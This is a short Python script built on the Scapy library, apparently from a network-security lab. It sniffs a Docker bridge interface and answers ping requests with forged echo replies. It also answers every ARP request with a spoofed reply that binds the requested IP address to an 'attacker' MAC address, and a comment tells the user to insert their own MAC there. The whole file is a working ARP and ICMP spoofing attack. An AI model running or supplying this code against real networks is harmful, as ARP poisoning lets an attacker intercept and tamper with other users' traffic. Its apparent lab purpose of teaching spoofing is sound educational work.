from scapy.all import *
from scapy.layers.inet import *
from scapy.layers.l2 import ARP


def cracking_ping(pkt):
    #pkt.show()
    if ICMP in pkt \
            and pkt[ICMP].type == 8 \
            and pkt[ICMP].code == 0:
        ether = Ether()
        ether.dst = pkt[Ether].src
        ether.src = pkt[Ether].dst

        a = IP()
        a.src = pkt[IP].dst
        a.dst = pkt[IP].src
        a.id = pkt[IP].id
        a.chksum = None

        b = ICMP()
        b.type = 0
        b.code = 0
        b.id = pkt[ICMP].id
        b.seq = pkt[ICMP].seq
        b.chksum = None
        b.payload = pkt[ICMP].payload

        current = a / b
        current.show2()

        send(current)

    elif ARP in pkt and pkt[ARP].op == 1:

        ## L'ARP REQUEST: l'indirizzo MAC dst è in broadcast ('ff:ff:ff:ff:ff:ff')
        MAC_Attacker = '02:42:8d:44:37:de' # PUT your MAC Address

        ether = Ether()
        a = ARP()

        ether.dst = pkt[Ether].src
        ether.src = MAC_Attacker

        a.op = 2
        a.hwsrc = MAC_Attacker
        a.hwdst = pkt[ARP].hwsrc
        a.psrc = pkt[ARP].pdst
        a.pdst = pkt[ARP].psrc
        a.hwlen = 6
        a.plen = 4
        frame = ether / a

        sendp(frame, iface='br-444c28130ffb')
        frame.show()


pkt = sniff(iface='br-444c28130ffb', filter='arp or icmp', prn=cracking_ping)